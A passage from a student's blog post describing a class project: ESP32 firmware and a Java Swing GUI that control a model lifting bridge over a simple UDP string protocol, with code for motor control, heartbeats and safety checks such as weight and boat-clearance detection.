BRIDGE: // Make noise setBuzzer(SOUND); // Set PWM signal for clockwise direction ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleCW); Serial.println(\u0026#34;INFO: Opening the bridge\u0026#34;); break; case GATE: // Set PWM signal for clockwise direction ledcWrite(PWM_CHANNEL_GATE, dutyCycleCW); Serial.println(\u0026#34;INFO: Opening the gate\u0026#34;); break; } } // Rotation for closing --\u0026gt; Can either be BRIDGE or GATE void rotateMotorForClose(Motor motorToMove) { // Rotate the motor in the opposite direction (2000 microseconds, counter-clockwise) int dutyCycleACW = (2000 / 20000.0) * 255; // Rotate according motor, make noise through buzzer and print in console switch (motorToMove) { case BRIDGE: // Make noise setBuzzer(SOUND); // Set PWM signal for counter-clockwise direction ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleACW); Serial.println(\u0026#34;INFO: Closing the bridge\u0026#34;); break; case GATE: // Set PWM signal for counter-clockwise direction ledcWrite(PWM_CHANNEL_GATE, dutyCycleACW); Serial.println(\u0026#34;INFO: Closing the gate\u0026#34;); break; } } // Stop motor --\u0026gt; Can either be BRIDGE or GATE void stopMotor(Motor motorToMove) { // Stop the motor (1500 microseconds, neutral) int dutyCycleStop = (1500 / 20000.0) * 255; switch (motorToMove) { case BRIDGE: setBuzzer(NO_SOUND); ledcWrite(BUZZER_CHANNEL, 0); // Set PWM signal for stop ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleStop); Serial.println(\u0026#34;INFO: Stopping the bridge motor\u0026#34;); break; case GATE: // Set PWM signal for stop ledcWrite(PWM_CHANNEL_GATE, dutyCycleStop); Serial.println(\u0026#34;INFO: Stopping the gate motor\u0026#34;); break; } } That wraps up all the main parts that control the ESP32 and its peripherals. The next two sections are just going to be about how the ESP talks to the Java program and all the safety features (that I found interesting) we implemented.\nCommunication with Java Program\rThe ESP32 communicates with the Java program using UDP over WiFi. For our demonstration and testing purposes we used a hotspot with credentials that were okay to have in the Git repo (not going to find any important creds so don\u0026rsquo;t bother).\nThere were a couple of things which were tedious with this though:\nHotspots have DHCP enabled and can\u0026rsquo;t be disabled. So this meant that every time we took a break from testing or came back to class the following week I\u0026rsquo;d have to figure out and update the IP address of the ESP32 in the Java program and vice versa. Another minor annoying thing was that the Windows Defender Firewall (needed to be turned off) blocked the communication being sent by the ESP32 but was okay with the packets being sent to the ESP32. The first few times I\u0026rsquo;d just sit there and look through the commit history wondering why everything magically stopped working. The communication protocol that we came up with uses simple string messages with two dedicated ports (randomly selected them):\nPort 3031: ESP32 listens on this port for messages from the Java program. Port 3032: Java listens on this port for messages from the ESP32. For the ESP32 side this was implemented using the WiFi.h and WifiUDP.h libraries.\nMessage Types\rThe messages sent between the two programs can be categorised into four different types:\nStatus Updates (ESP32 \u0026ndash;\u0026gt; Java)\rThe status updates are the messages sent every second and they include all the necessary system information in a pipe-delimited format:\nSTATUS: MODE:AUTOMATIC|BRIDGE:CLOSED|GATE:OPEN|ROAD_DISTANCE:27| BOAT_DISTANCE:27|BRIDGE_MOVEMENT_DISTANCE:1|BOAT_CLEARANCE_DISTANCE:30| ROAD_LIGHT:GREEN|BOAT_LIGHT:RED|BRIDGE_LIGHT:OFF|MANUAL_BRIDGE_LIGHTS:NO| SEQUENCE:IDLE|MOVEMENT_STATE:STATE_ONE\nLast year we had a similar project (had to make a train carriage) and the message format decided was JSON. But this was overkill (imo) and required a bunch of extra dependencies for the ESP23 and Java program so this time around we just decided to have the string with key-value pairs.\nThere are also a couple of additional fields in override mode that get included to this status update:\nSTATUS: MODE:OVERRIDE|\u0026hellip;|QUEUE:2|EXECUTING:YES\nThis is the entire communication.cpp file, showing the status update message format and how the WiFi libraries are used:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 #include \u0026#34;communication/communication.h\u0026#34; #include \u0026#34;config/config.h\u0026#34; #include \u0026#34;sensors/sensors.h\u0026#34; #include \u0026#34;types/types.h\u0026#34; // External global variables extern WiFiUDP udp; extern OperationalMode currentOperationalMode; extern BridgeGateState currentBridgeState; extern BridgeGateState currentGateState; extern BridgeSequenceState currentSequenceState; extern BridgeMovementState currentMovementState; extern LightColours currentRoadTrafficLight; extern LightColours currentBoatTrafficLight; extern BridgeLightState currentBridgeLightState; extern unsigned long totalBridgeOpenings; extern unsigned long totalBridgeClosings; extern unsigned long faultCount; extern unsigned long systemStartTime; extern bool isBridgeMovementExecutingInOverride; extern bool manualBridgeLights; extern QueueHandle_t pendingOverrideQueue; extern SemaphoreHandle_t stateMutex; /* Communication Function */ // Function to send updates via UDP void sendUpdate(String msg) { Serial.println(\u0026#34;INFO: Sending message to Java Program: \u0026#34; + msg); udp.beginPacket(remoteIP, remotePort); udp.print(msg); udp.endPacket(); } // Status update function void sendStatusUpdate() { // Acquire mutex (runs on main loop meaning the default Core 1 Application CPU) if (xSemaphoreTake(stateMutex, 50 / portTICK_PERIOD_MS)) { // Read current distances long roadDistance = readUltrasonicDistanceRoadTraffic(); long boatDistance = readUltrasonicDistanceBoatTraffic(); long bridgeMovementDistance = readUltrasonicDistanceBridgeMovement(); long boatClearanceDistance = readUltrasonicDistanceBoatClearance(); // Create the status message String statusMsg = \u0026#34;STATUS: \u0026#34;; statusMsg += \u0026#34;MODE:\u0026#34; + String(operationalModeToString(currentOperationalMode)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BRIDGE:\u0026#34; + String(bridgeGateStateToString(currentBridgeState)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;GATE:\u0026#34; + String(bridgeGateStateToString(currentGateState)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;ROAD_DISTANCE:\u0026#34; + String(roadDistance) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BOAT_DISTANCE:\u0026#34; + String(boatDistance) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BRIDGE_MOVEMENT_DISTANCE:\u0026#34; + String(bridgeMovementDistance) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BOAT_CLEARANCE_DISTANCE:\u0026#34; + String(boatClearanceDistance) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;ROAD_LIGHT:\u0026#34; + String(lightColourToString(currentRoadTrafficLight)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BOAT_LIGHT:\u0026#34; + String(lightColourToString(currentBoatTrafficLight)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;BRIDGE_LIGHT:\u0026#34; + String(bridgeLightStateToString(currentBridgeLightState)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;MANUAL_BRIDGE_LIGHTS:\u0026#34; + String(manualBridgeLights ? \u0026#34;YES\u0026#34; : \u0026#34;NO\u0026#34;) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;SEQUENCE:\u0026#34; + String(sequenceStateToString(currentSequenceState)) + \u0026#34;|\u0026#34;; statusMsg += \u0026#34;MOVEMENT_STATE:\u0026#34; + String(movementStateToString(currentMovementState)); // Add queue info if in override mode if (currentOperationalMode == OVERRIDE) { UBaseType_t queuedCommands = uxQueueMessagesWaiting(pendingOverrideQueue); statusMsg += \u0026#34;|QUEUE:\u0026#34; + String(queuedCommands); statusMsg += \u0026#34;|EXECUTING:\u0026#34; + String(isBridgeMovementExecutingInOverride ? \u0026#34;YES\u0026#34; : \u0026#34;NO\u0026#34;); } // Send the status update and release the mutex sendUpdate(statusMsg); xSemaphoreGive(stateMutex); } } The Java program then parses these status messages by splitting the strings based on the pipe and getting the key-value pairs:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 private void handleStatusUpdate(String message) { String content = message.substring(message.indexOf(\u0026#34;:\u0026#34;) + 1).trim(); String[] parts = content.split(\u0026#34;\\\\|\u0026#34;); for (String part : parts) { String[] keyValue = part.split(\u0026#34;:\u0026#34;); if (keyValue.length == 2) { String key = keyValue[0].trim(); String value = keyValue[1].trim(); switch (key) { case \u0026#34;MODE\u0026#34;: userInterface.updateMode(value); break; case \u0026#34;BRIDGE\u0026#34;: userInterface.updateBridgeState(value); break; // ... Etc } } } } Event Messages (ESP32 \u0026ndash;\u0026gt; Java)\rThe next type of messages that are sent are event messages whenever something \u0026ldquo;important\u0026rdquo; happens on the ESP32 side. This triggers notifications on the Java GUI. The following tables summarise these events:\nSystem Events:\nMessage Trigger Java Action SYSTEM_UPDATE: communication_connected First heartbeat received Show \u0026ldquo;Connected\u0026rdquo; notification SYSTEM_UPDATE: communication_lost Heartbeat timeout after 5s Show \u0026ldquo;Connection Lost\u0026rdquo; notification SYSTEM_UPDATE: diagnostic_mode Unknown bridge position Show \u0026ldquo;Diagnostic Mode\u0026rdquo; notification SYSTEM_UPDATE: restart_required Some error can\u0026rsquo;t recover from Show \u0026ldquo;Restart Required\u0026rdquo; notification SYSTEM_UPDATE: recovered Diagnostic recovery successful Show \u0026ldquo;Bridge Recovered\u0026rdquo; notification Mode Changes:\nMessage Trigger Java Action MODE_CHANGE: override_mode_active Switched to override mode Disable all the manual control buttons MODE_CHANGE: automatic_mode_active Switched to automatic mode Disable all the manual control buttons MODE_CHANGE: mode_change_completed Queued mode change executed Show \u0026ldquo;Mode Changed\u0026rdquo; notification Errors:\nMessage Trigger Java Action ERROR: override_denied_traffic_present Override requested with traffic detected Show error dialog ERROR: bridge_unknown_state Bridge position cannot be determined Show diagnostic mode notification ERROR: mode_change_timeout Mode change queued for more than 60s Show a timeout error ERROR: bridge_closing_failed Bridge open close properly Show recovery notification ERROR: bridge_opening_failed Bridge didn\u0026rsquo;t open properly Show recovery notification Warnings:\nMessage Trigger Java Action WARNING: command_queue_full|SIZE:3 Override queue at max capacity Show \u0026ldquo;Queue Full\u0026rdquo; warning WARNING: command_ignored_wrong_mode Override command sent in automatic mode Log warning message Emergency Stop:\nMessage Trigger Java Action EMERGENCY_STOP: activated|MODE:override|STATE:diagnostic Emergency stop triggered Flash red warning and show all lights active Commands (Java \u0026ndash;\u0026gt; ESP32)\rThe commands sent from the Java program to the ESP32 are also simple string messages. The ESP32 processes these in the main loop():\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /* The main loop */ void loop() { // Listen for incoming UDP packets int packetSize = udp.parsePacket(); // If there is a packet then accordingly process the command if (packetSize) { // Buffer to hold incoming packet char packetBuffer[255]; // Set all bytes at the buffer in memory to 0 memset(packetBuffer, 0, sizeof(packetBuffer)); // Read the packet into the buffer int bytesRead = udp.read(packetBuffer, packetSize); // Null-terminate at the exact length received packetBuffer[bytesRead] = \u0026#39;\\0\u0026#39;; // Convert buffer to string String cmd = String(packetBuffer); // Remove any extra whitespace cmd.trim(); // Remove null characters if they exist cmd.remove(cmd.indexOf(0x00)); for (int i = 0; i \u0026lt; cmd.length(); i++) { if (cmd[i] \u0026lt; 32 || cmd[i] \u0026gt; 126) { // Remove non-printable character cmd.remove(i, 1); // Adjust index after removal i--; } } Serial.println(\u0026#34;INFO: Command received: \u0026#34; + cmd); // ... Rest of the message received logic } // ... Rest of the main loop } These tables summarise the commands sent by the Java program:\nMode Control:\nCommand Description automatic_mode Switch to automatic mode override_mode Switch to override mode heartbeat Keep-alive signal Emergency and Safety:\nCommand Description emergency_stop Stop everything immediately silence_alarm Turn off buzzer perform_diagnostics Try bridge state recovery restart Restart ESP32 Override Mode Sequence Commands:\nCommand Description allow_boat_traffic Execute bridge opening sequence allow_road_traffic Execute bridge closing sequence run_full_test Test all states and transitions Override Mode Commands:\nCommand Description open_bridge Open bridge (no traffic light coordination) close_bridge Close bridge (no traffic light coordination) open_gate Open boom gate close_gate Close boom gate Override Mode Light Control Commands:\nCommand Description road_lights_red Set road lights to red road_lights_yellow Set road lights to yellow road_lights_green Set road lights to green road_lights_all Turn on all road lights boat_lights_red Set boat lights to red boat_lights_green Set boat lights to green boat_lights_all Turn on all boat lights bridge_lights_on Turn on bridge deck lights bridge_lights_off Turn off bridge deck lights Heartbeat (Java \u0026ndash;\u0026gt; ESP32)\rThe last message type is the heartbeat message sent from the Java program to the ESP32. The purpose of this is more important in when the bridge is in override mode. Essentially the bridge will go in automatic mode (if it isn\u0026rsquo;t already) if the ESP32 received the last heartbeat message more than 5 seconds ago. In the case that the Java program crashes this makes sure that the bridge is able to continue operating and doesn\u0026rsquo;t stay stuck in override.\nOn the Java side:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 public class Heartbeat extends Thread { private Send heartBeatSendObject; private Timer heartBeatTimer; private Gui userInterface; // Heartbeat interval in milliseconds (2 seconds) private static final long HEARTBEAT_INTERVAL = 2000; // Initial delay before first heartbeat (1 second) private static final long INITIAL_DELAY = 1000; Heartbeat(Send heartbeatObject, Gui userInterface) { this.heartBeatSendObject = heartbeatObject; this.userInterface = userInterface; // Make it a daemon thread this.heartBeatTimer = new Timer(true); } @Override public void run() { // scheduleAtFixedRate for repeating task heartBeatTimer.scheduleAtFixedRate(new TimerTask() { @Override public void run() { try { heartBeatSendObject.sendMessage(\u0026#34;heartbeat\u0026#34;); if (userInterface != null) { userInterface.updateMessageLog( \u0026#34;SENT: heartbeat\u0026#34;); } } catch (Exception e) { System.err.println(\u0026#34;Error sending heartbeat: \u0026#34; + e.getMessage()); } } }, INITIAL_DELAY, HEARTBEAT_INTERVAL); } public void stopHeartbeat() { if (heartBeatTimer != null) { heartBeatTimer.cancel(); System.out.println(\u0026#34;Heartbeat stopped\u0026#34;); } } } And on the ESP32 side in the main loop:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 // Check heartbeat timeout if (xSemaphoreTake(stateMutex, 100 / portTICK_PERIOD_MS)) { // Check communication with Java program has been lost bool heartbeatTimedOut = (millis() - lastHeartbeatMessage \u0026gt; HEARTBEAT_INTERVAL); // Communication just got lost if (heartbeatTimedOut \u0026amp;\u0026amp; communicationWithJavaIsAlive) { communicationWithJavaIsAlive = false; Serial.println(\u0026#34;SYSTEM_UPDATE: Lost communication with Java program\u0026#34;); if (currentOperationalMode == OVERRIDE) { // Clear override queue int cleared = clearOverrideQueue(); if (cleared \u0026gt; 0) { Serial.print(\u0026#34;INFO: Cleared \u0026#34;); Serial.print(cleared); Serial.println(\u0026#34; queued override commands\u0026#34;); } currentOperationalMode = AUTOMATIC; // Only reset state if not currently executing if (!isBridgeMovementExecutingInOverride) { currentSequenceState = IDLE; currentMovementState = STATE_ONE; Serial.println(\u0026#34;SYSTEM_UPDATE: Reset to IDLE state (no execution in progress)\u0026#34;); } else { // Check if execution has been going too long unsigned long executionTime = millis() - overrideExecutionStartTime; const unsigned long OVERRIDE_EXECUTION_TIMEOUT = 60000; // 60 seconds if (executionTime \u0026gt; OVERRIDE_EXECUTION_TIMEOUT) { Serial.println(\u0026#34;ERROR: Override execution timeout - forcing DIAGNOSTIC\u0026#34;); currentSequenceState = DIAGNOSTIC; isBridgeMovementExecutingInOverride = false; setRoadTrafficLights(ALL); setBoatTrafficLights(ALL); } else { Serial.print(\u0026#34;INFO: Allowing operation to complete (\u0026#34;); Serial.print((OVERRIDE_EXECUTION_TIMEOUT - executionTime) / 1000); Serial.print(\u0026#34;s timeout remaining, state: \u0026#34;); Serial.print(sequenceStateToString(currentSequenceState)); Serial.println(\u0026#34;)\u0026#34;); } } manualBridgeLights = false; // Cancel any pending mode changes pendingModeChange.pending = false; Serial.println(\u0026#34;SYSTEM_UPDATE: Switched to automatic mode due to communication loss\u0026#34;); sendUpdate(\u0026#34;SYSTEM_UPDATE: communication_lost\u0026#34;); } } xSemaphoreGive(stateMutex); } Safety Features\rThis section goes over all the extra features and cool stuff we added for more marks that I thought were worthy of being in this post.\nWeight Monitoring\rSo as talked about before, we used an OP amp to determine the weight on the bridge. We used this value to determine whether or not the bridge opening sequence should go ahead (if the weight exceeds 2160, found through manual testing, then that means there is something on the bridge so don\u0026rsquo;t open it). If the bridge did have weight on it then it would just go back into the CARS_PASSING mode (10 second wait again) and open the gates to allow the bridge to clear. Function for this weight check:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // Check for what the weight is on the bridge through OP Amp long checkBridgeWeight() { Serial.println(\u0026#34;INFO: Performing bridge weight check\u0026#34;); // Rotate the motor in one direction (600 microseconds, clockwise) briefly int dutyCycleCW = (600 / 20000.0) * 255; ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleCW); // Wait for current to stabilise delay(50); // Read the current draw (proportional to weight) long weightReading = readAdcSensorValue(BRIDGE_WEIGHT); delay(25); long weightReading2 = readAdcSensorValue(BRIDGE_WEIGHT); delay(25); long weightReading3 = readAdcSensorValue(BRIDGE_WEIGHT); // Get the average long averageWeight = (weightReading + weightReading2 + weightReading3) / 3; // Stop motor immediately int dutyCycleStop = (1500 / 20000.0) * 255; ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleStop); Serial.print(\u0026#34;INFO: Weight check ADC reading is: \u0026#34;); Serial.println(averageWeight); return averageWeight; #endif } And this is how checkBridgeWeight was actually used in the bridge task:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 long weightReading = checkBridgeWeight(); // Send weight reading to Java sendUpdate(\u0026#34;WEIGHT_CHECK: \u0026#34; + String(weightReading)); // Re-acquire lock xSemaphoreTake(stateMutex, portMAX_DELAY); if (weightReading \u0026gt; WEIGHT_SAFETY_MARGIN) { Serial.print(\u0026#34;INFO: Weight on bridge is overloaded, re-closing bridge: \u0026#34;); Serial.println(weightReading); int dutyCycleACW = (2000 / 20000.0) * 255; ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleACW); xSemaphoreGive(stateMutex); // Ensure return to close delay(150); xSemaphoreTake(stateMutex, portMAX_DELAY); int dutyCycleStop = (1500 / 20000.0) * 255; ledcWrite(PWM_CHANNEL_BRIDGE, dutyCycleStop); sendUpdate(\u0026#34;SYSTEM_UPDATE: bridge_overloaded\u0026#34;); currentBridgeState = CLOSED; xSemaphoreGive(stateMutex); // Don\u0026#39;t proceed with opening continue; } Boat Clearance Detection\rAnother feature that we added was having an ultrasonic sensor under the bridge. The purpose of this was to stop the bridge from closing in the case that a boat decided to run a red light. We configured this value to be anything less than 15cm since the water was 15cm away when the bridge is fully closed. The implementation for this function was the same as the other ultrasonic sensors and this was how it got used in the bridge task:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 const int BRIDGE_BOAT_DETECTED_WHILE_MOVING = 15; while (bridgeDistance \u0026lt; BRIDGE_CLOSED_DISTANCE) { // Timeout check if (millis() - operationStartTime \u0026gt; BRIDGE_TIMEOUT) { timeoutOccurred = true; break; } // Clearance check long distanceUnderBridge = readUltrasonicDistanceBoatClearance(); if (isValidSensorReading(distanceUnderBridge) \u0026amp;\u0026amp; distanceUnderBridge \u0026lt; BRIDGE_BOAT_DETECTED_WHILE_MOVING) { Serial.println(\u0026#34;ERROR: Detected boat while closing bridge\u0026#34;); boatsDetectedDuringClosing = true; // Stop moving the bridge break; } // ... Rest of the close bridge logic } // After the loop handle the boat detection if (boatsDetectedDuringClosing) { currentBridgeState = OPEN; } Traffic Detection Before Mode Switching\rThe ESP32 won\u0026rsquo;t switch into override mode if traffic is present (to match the use case of override mode):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 else if (cmd.startsWith(\u0026#34;override_mode\u0026#34;)) { // Move to override // Mutex already held at this point so read the sensor values long roadDistance = readUltrasonicDistanceRoadTraffic(); long boatDistance = readUltrasonicDistanceBoatTraffic(); bool roadTrafficDetected = isValidSensorReading(roadDistance) \u0026amp;\u0026amp; roadDistance \u0026lt; CARS_WAITING_DISTANCE * 0.7; bool boatTrafficDetected = isValidSensorReading(boatDistance) \u0026amp;\u0026amp; boatDistance \u0026lt; BOATS_WAITING_DISTANCE * 0.7; if (roadTrafficDetected || boatTrafficDetected) { Serial.println(\u0026#34;ERROR: Override mode denied - traffic present\u0026#34;); sendUpdate(\u0026#34;ERROR: override_denied_traffic_present\u0026#34;); // Don\u0026#39;t queue the request pendingModeChange.pending = false; } // ,, Rest of the override mode command logic } Mode Change Queuing\rThe mode changes are also queued (just like the bridge/gate tasks). This is done so that mode changes only occur when the bridge isn\u0026rsquo;t moving:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 bool isSafeToSwitchMode() { return ((currentSequenceState == IDLE || currentSequenceState == BOATS_PASSING || currentSequenceState == CARS_PASSING) \u0026amp;\u0026amp; !isBridgeMovementExecutingInOverride); } // In main loop: if (pendingModeChange.pending) { unsigned long elapsed = millis() - pendingModeChange.requestTime; if (isSafeToSwitchMode()) { // Execute the queued mode change currentOperationalMode = pendingModeChange.requestedMode; currentSequenceState = IDLE; clearOverrideQueue(); pendingModeChange.pending = false; } else if (elapsed \u0026gt; 60000) { // Timeout after 60 seconds Serial.println(\u0026#34;ERROR: Mode change request timed out\u0026#34;); pendingModeChange.pending = false; } } Diagnostic and Recovery Mode\rThis one was really fun. When the bridge is in an UNNNOWN state it first tries to determine where the bridge (using the ultrasonic sensor on top of the bridge) is before going into a state where manual reset is required:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 case DIAGNOSTIC: Serial.println(\u0026#34;SYSTEM_UPDATE: System is in DIAGNOSTIC mode\u0026#34;); setRoadTrafficLights(ALL); setBoatTrafficLights(ALL); long bridgeDistance = readUltrasonicDistanceBridgeMovement(); if (isValidSensorReading(bridgeDistance)) { // Double tolerance for recovery (4cm instead of 2cm) if (abs(bridgeDistance - BRIDGE_OPEN_DISTANCE) \u0026lt; TOLERANCE * 2) { // Bridge appears open currentBridgeState = OPEN; currentSequenceState = BOATS_PASSING; changeGateStateAsync(CLOSED); vTaskDelay(GATE_TRANSITION_INTERVAL / portTICK_PERIOD_MS); setBoatTrafficLights(GREEN); setRoadTrafficLights(RED); sequenceStartTime = millis(); Serial.println(\u0026#34;SYSTEM_UPDATE: Recovered, bridge is OPEN\u0026#34;); return; } else if (abs(bridgeDistance - BRIDGE_CLOSED_DISTANCE) \u0026lt; TOLERANCE * 2) { // Bridge appears closed currentBridgeState = CLOSED; currentSequenceState = CARS_PASSING; changeGateStateAsync(OPEN); vTaskDelay(GATE_TRANSITION_INTERVAL / portTICK_PERIOD_MS); setBoatTrafficLights(RED); setRoadTrafficLights(GREEN); Serial.println(\u0026#34;SYSTEM_UPDATE: Recovered, bridge is CLOSED\u0026#34;); return; } } // Unable to recover Serial.println(\u0026#34;ERROR: Bridge position unknown, restart required\u0026#34;); restartRequired = true; break; Timeout Protection\rAll the motor operations are capped to 30 seconds and after that they are timed out (prevent infinite loops):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const unsigned long BRIDGE_TIMEOUT = 30000; while (bridgeDistance \u0026gt; BRIDGE_OPEN_DISTANCE) { if (millis() - operationStartTime \u0026gt; BRIDGE_TIMEOUT) { timeoutOccurred = true; break; } // ... movement logic } if (timeoutOccurred) { // Triggers diagnostic mode currentBridgeState = UNKNOWN; } Testing Sequence\rIn override mode there is a full testing sequence that the operator can trigger. The code for that is too large to put here but it essentially checks all the parts of the system:\nOpen/close the bridge and gate. Turn on/off all the lights. Turn on/off the buzzer. Test communication with the GUI. Final Look of the ESP32 and Bridge\rAfter all that reading, here\u0026rsquo;s what the final bridge ended up looking like (all the circuitry was on top of the bridge):\nAnd here is the bridge looked like in automatic mode. Note that the gate wasn\u0026rsquo;t working as the gate motor wasn\u0026rsquo;t able to get enough power (you can hear it struggling):\nYour browser doesn't support HTML5 video. Here is a\rlink to the video instead.\rJava Program\rOverview\rOnto the last part of this project, the actual Java program (built using Gradle). It\u0026rsquo;s much simpler than the ESP32 program. The main functions of this program include monitoring and controlling:\nThe current operational mode. Bridge and gate positions. Light states (traffic and bridge). All the current sensor readings. The sequence and movement states. The queue size in override mode. Message log with timestamps. Notifications for important events. Panel for connection status. The architecture for this one is pretty simple. There\u0026rsquo;s a GUI class that handles the display and user input, and then there\u0026rsquo;s 3 separate threads to manage the network communications.\nMultithreading\rSo the three threads to keep the GUI responsive whilst handling the network communication include:\nMain Thread (GUI):\nThis handles all the Swing GUI parts and user interactions. Updates all the displays based on messages from the receive thread. Processes the button clicks and sends commands through a send object. Receive Thread:\nThis continuously listens for packets from the ESP32. It parse all the incoming messages and update the GUI by using SwingUtilities.invokeLater(). Heartbeat Thread:\nThis sends the \u0026ldquo;heartbeat\u0026rdquo; message every 5 seconds. It runs independent to the other threads and user interactions. The main reason for this multi-threading is to ensure tha the GUI doesn\u0026rsquo;t freeze everytime the socket.receive() function is called to listen for UDP packets. Here\u0026rsquo;s how all this works:\nSend Class\rThe Send class is a simple class to provide functions to send commands to the ESP32:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package mcp; import java.io.IOException; import java.net.DatagramPacket; import java.net.DatagramSocket; import java.net.InetAddress; import java.net.SocketException; import java.net.UnknownHostException; public class Send { private DatagramSocket espSendSocket; private int espSendPortNumber; InetAddress espSendIpAddr; private Gui userInterface; private boolean sendNotifications = false; // Constructor to set destination port/ipaddr variables and initialise // espSendSocket Send(int espSendPortNumber, String espSendIpAddr, Gui userInterface) { if (userInterface != null) { this.userInterface = userInterface; sendNotifications = true; } this.espSendPortNumber = espSendPortNumber; try { this.espSendIpAddr = InetAddress.getByName(espSendIpAddr); espSendSocket = new DatagramSocket(); } catch (UnknownHostException e) { System.out.println(\u0026#34;Ran into an UnknownHostException: \u0026#34; + e); } catch (SocketException e) { System.out.println(\u0026#34;Ran into an SocketException: \u0026#34; + e); } } public void sendMessage(String message) { try { // Create message based on the string and send it to the destination as per the // global variables byte[] sendBuffer = message.getBytes(); DatagramPacket sendPacket = new DatagramPacket(sendBuffer, sendBuffer.length, espSendIpAddr, espSendPortNumber); espSendSocket.send(sendPacket); if (sendNotifications) { userInterface.showNotification(\u0026#34;Sent message to esp: \u0026#34; + message); } System.out.println(\u0026#34;Sent message to esp: \u0026#34; + message); } catch (IOException e) { System.out.println(\u0026#34;Ran into an IOException: \u0026#34; + e); } } } This class won\u0026rsquo;t cause any thread or concurrency issues since the UDP sockets can be shared and be used by the GUI thread and the heartbeat thread.\nReceive Class\rThe Receive class runs on its own thread (uses the Runnable interface) and listens for messages:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 public class Receive implements Runnable { private DatagramSocket socket; private volatile boolean running = true; private Gui userInterface; private byte[] buffer; public Receive(int port, Gui gui) { try { this.socket = new DatagramSocket(port); this.userInterface = gui; this.buffer = new byte[1024]; System.out.println(\u0026#34;Receive thread listening on port \u0026#34; + port); } catch (SocketException e) { System.err.println(\u0026#34;Failed to create receiver: \u0026#34; + e.getMessage()); } } @Override public void run() { while (running) { try { DatagramPacket packet = new DatagramPacket(buffer, buffer.length); // Blocks here until packet arrives socket.receive(packet); String message = new String( packet.getData(), 0, packet.getLength() ).trim(); System.out.println(\u0026#34;Received: \u0026#34; + message); parseMessage(message); } catch (IOException e) { if (running) { System.err.println(\u0026#34;Receive error: \u0026#34; + e.getMessage()); } } } } private void parseMessage(String message) { if (message.startsWith(\u0026#34;STATUS:\u0026#34;)) { handleStatusUpdate(message); } else if (message.startsWith(\u0026#34;EMERGENCY_STOP:\u0026#34;)) { handleEmergencyStop(message); } else if (message.startsWith(\u0026#34;ERROR:\u0026#34;)) { handleErrorMessage(message); } else if (message.startsWith(\u0026#34;WARNING:\u0026#34;)) { handleWarningMessage(message); } else if (message.startsWith(\u0026#34;SYSTEM_UPDATE:\u0026#34;)) { handleSystemUpdate(message); } } public void stop() { running = false; if (socket != null \u0026amp;\u0026amp; !socket.isClosed()) { socket.close(); } } } The main part here is that socket.receive(packet) blocks the entire thread until a packet arrives, but this won\u0026rsquo;t stop the GUI from running. Once a message arrives, it gets parsed and updated in the GUI using SwingUtiliteis.invokeLater():\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 private void handleStatusUpdate(String message) { // Parse the message String content = message.substring(message.indexOf(\u0026#34;:\u0026#34;) + 1).trim(); String[] parts = content.split(\u0026#34;\\\\|\u0026#34;); // Update GUI on the Event Dispatch Thread SwingUtilities.invokeLater(() -\u0026gt; { for (String part : parts) { String[] keyValue = part.split(\u0026#34;:\u0026#34;); if (keyValue.length == 2) { String key = keyValue[0].trim(); String value = keyValue[1].trim(); switch (key) { case \u0026#34;MODE\u0026#34;: userInterface.updateMode(value); break; case \u0026#34;BRIDGE\u0026#34;: userInterface.updateBridgeState(value); break; // ... Etc } } } }); } Heartbeat Class\rThis thread runs indepedent to the other the other threads so that the ESP32 knows the connection with the Java program is alive:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 